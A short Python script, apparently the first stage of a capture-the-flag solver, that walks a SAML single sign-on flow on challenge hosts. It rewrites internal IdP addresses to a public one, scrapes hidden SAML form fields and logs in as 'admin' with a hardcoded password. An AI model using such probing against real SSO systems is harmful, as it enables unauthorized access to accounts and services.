import urllib.request, urllib.parse, http.cookiejar, re

IDP="http://oj-10-30-15-1-58595.adworld.xctf.org.cn"
SP="http://oj-10-30-15-1-49263.adworld.xctf.org.cn"

cj=http.cookiejar.CookieJar()
class NoRedir(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, *a, **k): return None
op=urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj), NoRedir())

def req(u, data=None, headers=None):
    h={'User-Agent':'Mozilla/5.0'}
    if headers: h.update(headers)
    if data is not None:
        d=urllib.parse.urlencode(data).encode()
        r=urllib.request.Request(u, data=d, headers=h)
    else:
        r=urllib.request.Request(u, headers=h)
    try:
        resp=op.open(r, timeout=25)
        return resp.status, resp.read().decode('utf-8','replace'), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8','replace'), dict(e.headers)

def fix(u):
    # replace internal idp hosts with public idp
    u=re.sub(r'http://127\.0\.0\.1(:\d+)?', IDP, u)
    u=re.sub(r'http://idp(:80)?', IDP, u)
    u=re.sub(r'http://localhost(:\d+)?', IDP, u)
    return u

# 1. SP login
s,b,h=req(SP+"/saml/login")
sso=fix(h.get('Location'))
print("[1] SSO url:", sso)

# 2. hit SSO at IdP
s,b,h=req(sso)
print("[2] SSO status:", s, "loc:", (h.get('Location') or '')[:120])
loc=h.get('Location')
if loc:
    login_url=IDP+loc if loc.startswith('/') else fix(loc)
    s,b,h=req(login_url)
    print("[2b] login page status:", s)
    # extract hidden samlRequest / relayState
    sr=re.search(r'name="samlRequest" value="([^"]*)"', b)
    rs=re.search(r'name="relayState" value="([^"]*)"', b)
    print("   samlRequest hidden:", (sr.group(1)[:60] if sr else None))

# 3. do login
s,b,h=req(IDP+"/login", data={"username":"admin","password":"RCTF2025"})
print("[3] login status:", s, "loc:", (h.get('Location') or '')[:120])
print(b[:200])
